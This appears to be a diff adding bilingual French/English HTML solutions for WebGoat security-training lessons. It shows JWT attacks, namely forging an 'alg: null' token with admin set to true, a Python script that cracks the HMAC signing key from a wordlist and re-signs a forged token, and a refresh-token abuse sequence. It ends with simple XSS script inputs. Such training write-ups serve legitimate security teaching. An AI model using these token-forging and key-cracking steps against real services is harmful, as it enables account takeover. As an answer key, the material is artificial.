+            Intercept the request and notice the header: <code> Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA</code>
+            <br>
+            In base64, this is decoded as: <code>{"alg":"HS512"}.{"Iat":1564402244,"admin":"false","user":"Tom"}.signature</code>
+            <br>
+            Edit it to <code>{"alg": null}.{"Iat":1564402244,"admin":"true","user":"Tom"}.</code>,
+            Re-encode it to base64 (<code>eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiiiiiUU20BQQ==.</code>)
+            and return the request to validate the lesson (validation bugged).
+        </span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            5. Il est possible d'effectuer ce challenge à l'aide d'outils tels que <b>johntheripper</b> and https://jwt.io/, mais afin de mieux comprendre voilà un petit script Python. 
+            <br>
+        </span>
+        <span class="multilang" lang="en">
+            5. It is possible to validate this challenge with tools like <b>johntheripper</b> and https://jwt.io/, but in order to get a better understanding og the whole process, here a Python script. 
+            <br>
+        </span>
+        <div><br></div>
+        <code>
+            import base64
+            <br>
+            import hashlib
+            <br>
+            import hmac
+            <br>
+            <br>
+            def jwt_tokens_5():
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM'.split('.')
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"tom@webgoat.com","username":"WebGoat","Email":"tom@webgoat.com","Role":["Manager","Project Administrator"]}'.encode()
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; unsigned_token = (token[0] + '.' + token[1]).encode()
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; # signature is base64 URL encoded and padding has been removed, so we must add it
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; with open('google-10000-english-master/google-10000-english.txt', 'r') as fd:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lines = [line.rstrip('\n').encode() for line in fd]
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; def hmac_to_base64(key, message):
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; for line in lines:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; test = hmac_to_base64(line, unsigned_token)
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; if test == signature:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print('Key: {}'.format(line.decode()))
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new_token = (token[0] + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new_signature = hmac_to_base64(line, new_token)
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new_token += ('.' + new_signature.decode().rstrip('=')).encode()
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print('New token: {}'.format(new_token.decode()))
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
+            <br>
+            <br>
+            jwt_tokens_5()
+        </code>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            7. Ce challenge ne donne pas assez d'informations pour être résolu. En fouillant dans le code source, on se rend compte qu'il faut :
+            <br>
+            Faire une requête POST vers http://host:port/WebGoat/JWT/refresh/login, ayant pour en-tête <code>Content-Type: application/json</code> et pour corps <code>{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}</code>
+            <br>
+            Récupérer le token d'actualisation envoyé en réponse.
+            <br>
+            Récupérer le token d'accès de Tom dans les <b>logs</b>.
+            <br>
+            Faire une requête POST vers http://host:port/WebGoat/JWT/refresh/newToken , ayant pour en-tête <code>Content-Type: application/json</code> et <code>Authorization: Bearer &lt;tom_access_token&gt;</code> et pour corps <code>{"refresh_token":"&lt;jerry_refresh_token&gt;"}</code>
+            <br>
+            Récupérer le nouveau token d'accès de Tom.
+            <br>
+            Intercepter la requpete vers http://host:port/WebGoat/JWT/refresh/checkout et ajouter l'en-tête <code>Authorization: Bearer &lt;tom_new_access_token&gt;</code> (la validation est buggée).
+        </span>
+        <span class="multilang" lang="en">
+            7. The challenge doesn't give enough information to be completed. By looking into the source code, we can find the following has to be done:
+            <br>
+            Make a POST request to http://host:port/WebGoat/JWT/refresh/login with header <code>Content-Type: application/json</code> and content <code>{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}</code> to obtain a <code>&lt;jerry_refresh_token&gt;</code>.
+            <br>
+            Take the <code>&lt;tom_access_token&gt;</code> from the logs.
+            <br>
+            Make a POST request to http://host:port/WebGoat/JWT/refresh/newToken with header <code>Content-Type: application/json</code> and <code>Authorization: Bearer &lt;tom_access_token&gt;</code> and content <code>{"refresh_token":"&lt;jerry_refresh_token&gt;"}</code> to obtain <code>&lt;tom_access_token_new&gt;</code>.
+            <br>
+            Intercept the POST request to http://host:port/WebGoat/JWT/refresh/checkout and add header <code>Authorization: Bearer &lt;tom_access_token_new&gt;</code>
+        </span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            8. Identique au 4. en replaçant en plus le nom d'utilisateur par Tom. 
+        </span>
+        <span class="multilang" lang="en">
+            8. Identical to  4. with the need to replace the username with Tom.
+        </span>
+    </div>
+</div>
+<div><br></div>
+<div><br></div>
+<div>
+    <h4><u><b>Cross-Site Scripting (XSS):</b></u></h4>
+    <div>
+        <div><br></div>
+        <h5>Cross Site Scripting</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+		2. Les principaux navigateurs ont banni le Javascript de la barre d'URL, contrairement à ce que laisse penser la consigne. Ouvir plurtôt les <i>Outils de développements</i>, et l'onglet <i>Console</i>. La réponse attendue est <code>Yes</code>.
+		</span>
+        <span class="multilang" lang="en">
+		2. The main browsers have banned Javascript from the URL bar, contrary to the suggestion. Open the <i>Development Tools</i>, and the <i>Console</i> tab. The expected answer is <code>Yes</code>.
+		</span>
+		<div><br></div>
+        <span class="multilang" lang="fr">
+		7. Entrer <code>&lt;script&gt;alert()&lt;/script&gt;</code> dans la case <b>Enter your credit card number:</b>.
+		</span>
+        <span class="multilang" lang="en">
+		7. Put <code>&lt;script&gt;alert()&lt;/script&gt;</code> in the box <b>Enter your credit card number:</b>.
+		</span>
+    </div>
+</div>
+		
